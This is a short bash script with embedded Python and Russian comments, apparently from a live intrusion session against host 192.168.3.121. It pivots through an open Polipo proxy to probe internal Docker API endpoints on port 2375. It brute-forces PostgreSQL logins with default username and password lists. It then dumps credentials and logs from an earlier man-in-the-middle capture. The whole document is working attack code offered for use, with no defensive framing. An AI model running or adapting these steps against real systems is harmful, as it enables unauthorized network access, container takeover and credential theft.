echo "=== POLIPO → DOCKER NETWORK ==="
python3 -c "
import urllib.request
# Polipo прокси на hung1 → пробуем внутренние Docker сервисы
proxy='http://192.168.3.121:8123'
op=urllib.request.build_opener(urllib.request.ProxyHandler({'http':proxy}))
for target in ['http://172.18.0.1:2375/version','http://172.18.0.8:8000/','http://localhost:2375/version','http://127.0.0.1:2375/version','http://172.17.0.1:2375/version']:
    try:
        r=op.open(target,timeout=5)
        print(target,'→',r.read()[:200])
    except Exception as e:
        err=str(e)[:60]
        if 'Connection refused' not in err and 'timed out' not in err:
            print(target,'→',err)
"
echo "=== PG: коннект с дефолтами ==="
for U in postgres hung eaera root admin; do
  for PW in "" "postgres" "hung123" "Password123!"; do
    R=$(timeout 5 python3 -c "
import psycopg2
try:
    c=psycopg2.connect(host='192.168.3.121',port=5432,user='$U',password='$PW',connect_timeout=3)
    cur=c.cursor(); cur.execute('SELECT version()')
    print('OK:',cur.fetchone()[0][:50])
except Exception as e:
    pass
" 2>/dev/null)
    [ -n "$R" ] && echo "PG $U/$PW: $R" && break 2
  done
done
echo "=== MITM CREDS CHECK ==="
cat /tmp/creds_new.txt 2>/dev/null | head -10
cat /tmp/mitm_log.txt 2>/dev/null | tail -3
ls -la /tmp/mitm3.pcap 2>/dev/null | awk '{print "pcap:",$5,"bytes"}'
echo POLIPO-DOCKER